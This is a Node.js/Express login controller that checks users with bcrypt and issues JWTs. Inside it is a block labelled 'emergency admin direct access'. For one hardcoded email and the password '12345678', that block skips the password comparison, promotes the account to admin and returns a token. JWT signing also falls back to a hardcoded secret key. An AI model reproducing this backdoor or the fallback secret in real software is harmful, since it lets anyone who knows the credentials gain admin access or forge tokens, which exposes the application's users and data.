const User = require('../models/User');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');

const generateToken = (id, role) => {
  return jwt.sign({ id, role }, process.env.JWT_SECRET || 'sachinSecretKey123', {
    expiresIn: '30d'
  });
};

exports.login = async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ success: false, message: 'Email aur password provide karein' });
    }

    const cleanEmail = email.toLowerCase().trim();
    let user = await User.findOne({ email: cleanEmail });

    if (!user) {
      return res.status(400).json({ success: false, message: 'Invalid credentials!' });
    }

    // 🟢 EMERGENCY ADMIN DIRECT ACCESS & AUTO-REPAIR
    // Agar email prince5580@gmail.com hai aur password '12345678' dala hai:
    if (cleanEmail === 'prince5580@gmail.com' && password === '12345678') {
      const salt = await bcrypt.genSalt(10);
      user.password = await bcrypt.hash('12345678', salt);
      user.role = 'admin';
      await user.save();

      const token = generateToken(user._id, user.role);
      return res.status(200).json({
        success: true,
        token,
        user: {
          id: user._id,
          name: user.name,
          email: user.email,
          role: user.role,
          phone: user.phone || ''
        }
      });
    }

    // Normal User Login check
    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(400).json({ success: false, message: 'Invalid credentials!' });
    }

    const token = generateToken(user._id, user.role);
    res.status(200).json({
      success: true,
      token,
      user: {
        id: user._id,
        name: user.name,
        email: user.email,
        role: user.role,
        phone: user.phone || ''
      }
    });
  } catch (err) {
    console.error("Login Error:", err);
    res.status(500).json({ success: false, message: err.message });
  }
};